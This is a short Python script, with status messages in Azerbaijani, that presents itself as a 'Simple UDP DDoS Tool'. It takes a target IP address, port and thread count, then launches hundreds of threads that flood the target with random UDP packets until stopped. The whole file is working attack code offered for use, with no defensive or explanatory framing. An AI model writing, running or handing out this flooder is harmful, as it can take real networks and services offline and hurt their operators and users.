import sys
import socket
import threading
import random
import time

if len(sys.argv) < 3:
    print("╔════════════════════════════════════╗")
    print("║       Simple UDP DDoS Tool         ║")
    print("║   Usage: python ddos.py <IP> <PORT> [THREADS]  ║")
    print("╚════════════════════════════════════╝")
    print("Example: python ddos.py 192.168.1.1 80 500")
    sys.exit(1)

target_ip = sys.argv[1]
target_port = int(sys.argv[2])
threads = int(sys.argv[3]) if len(sys.argv) > 3 else 600

print(f"[+] Hücum başladılır → {target_ip}:{target_port}")
print(f"[+] {threads} thread ilə işləyir... (Dayandırmaq üçün Ctrl + C)")

def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            # Böyük random payload
            payload = random.randbytes(random.randint(1024, 4096))
            sock.sendto(payload, (target_ip, target_port))
        except:
            pass

# Thread-ləri işə sal
for _ in range(threads):
    t = threading.Thread(target=udp_flood, daemon=True)
    t.start()

print("[+] Attack aktivdir. Maksimum gücə çalışır...")

try:
    while True:
        time.sleep(10)
except KeyboardInterrupt:
    print("\n[-] Hücum dayandırıldı.")2
